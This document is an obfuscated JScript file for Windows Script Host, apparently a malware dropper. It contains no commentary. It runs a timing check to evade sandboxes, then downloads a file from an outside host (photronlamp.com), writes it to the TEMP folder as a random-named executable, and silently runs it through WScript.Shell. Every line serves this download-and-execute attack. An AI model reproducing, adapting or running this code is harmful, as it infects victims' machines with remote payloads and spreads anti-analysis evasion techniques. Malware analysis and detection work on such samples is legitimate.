var _J = false;
var _DU = "CreateObject";
var _K0 = function _TG() {return WScript[_DU]("WScript"+".Shell");}(), _EH = 11;
var _NJ = "MSXML2.XMLHTTP";
var _OY = 2123213;
var _XP = 0;
function _DW(_CV){_K0["Run"](_CV, _XP, _XP);};
function _I(){return _NJ + "";};
function _B(_I1, _KZ){_XP = _XP * 1; return _I1 - _KZ;};
function _N1(){return _DU;};
/*@cc_on
  @if (@_win32 || @_win64)
    _J = true;
  @end
@*/
if (_J)
{
var _B0 = "";
function _PX(){return 22;};
var _VN = 0; var _GN = 0;
function _N0()
{
var _W0 = new this["Date"]();
var _OI = _W0["getUTCMilliseconds"]();
WScript["Sleep"](_PX());
var _W0 = new this["Date"]();
var _W = _W0["getUTCMilliseconds"]();
WScript["Sleep"](_PX());
var _W0 = new this["Date"]();
var _N2 = _W0["getUTCMilliseconds"]();
var _VN = "_GT";
_VN = _B(_W, _OI);
var _GN = "_GG";
_GN = _B(_N2, _W);
_B0 = "open";
return _B(_VN, _GN);
}
var _IJ = false;
var _MB = false;
for (var _H = _XP; _H < _PX() * 1; _H++){if (_N0() != _XP){
_IJ = true; 
_GN = "31" + 11 * _VN + _GN; 
_MB = true; 
break;
}}
function _N() {return ((_IJ == true) && (_IJ == _MB)) ? 1 : _XP;};
if (_IJ && _N() && _MB){
function _QL() {return _K0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "2ScNwINGH60VbaD.ex" + "e";};
 _D = _I();
 _I0 = WScript[_DU](_D);
 var _UL = 1;
 while (_UL){
try {
	if (_UL == 1)
	{
		_I0[_B0]("GET", "http://photronlamp.com/m39ska", false);
		_I0["send"]();
		_F = "Sleep";
	}
	WScript[_F](_PX() + 120); 
	if (_I0["readystate"] < 2 * 2) continue;
	_UL = _XP;
	function _SM(_EU) {var _YI = (1, 2, 3, 4, 5, _EU); return _YI;};
	_CG = WScript[_N1()]("ADODB.Stream");
	_D = _CG;
	_D[_B0]();
	_D["type"] = _SM(1);
	_D["write"](_I0["ResponseBody"]);
	_CG["position"] = _SM(_XP);
	_D["Save" + "ToFile"](_QL(), 2);
	_CG["cl"+"ose"]();
	_ZE = _QL();
	_DW(_ZE);
} catch(_K){};
}
}
}

